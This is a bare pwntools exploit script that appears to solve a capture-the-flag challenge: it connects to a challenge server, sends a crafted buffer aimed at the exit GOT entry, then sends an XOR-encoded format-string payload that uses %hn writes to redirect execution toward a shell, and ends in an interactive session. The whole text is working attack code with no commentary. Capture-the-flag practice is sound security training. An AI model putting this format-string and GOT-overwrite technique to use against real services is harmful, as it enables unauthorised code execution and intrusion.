from pwn import *
p=process("./CAL")
p=remote("chal.noxale.com",5678)
p.readuntil("name?\n")

sh=0x8048596
exit_got=0x804a024#8048476
payload=p32(0x804A04C)+p32(exit_got)
p.send(payload.ljust(28)+p32(0x6A4B825))
p.readuntil("please\n")
db=0xdeadbeef

p0="%34198c%28$hn%27$n".ljust(24)
p1=u32(p0[0:4])
p2=u32(p0[4:8])
p3=u32(p0[8:12])
p4=u32(p0[12:16])
p5=u32(p0[16:20])
p6=u32(p0[20:24])
offset=12
raw=p32(p1^0x36691253)+p32(p2^0x36363636)+p32(p3^0x36363636)+p32(p4^0x36363636)+p32(p5^0x36363636)+p32(p6^0x65363636)
raw=raw.ljust(0x1c)
p.sendline(raw)
p.interactive()

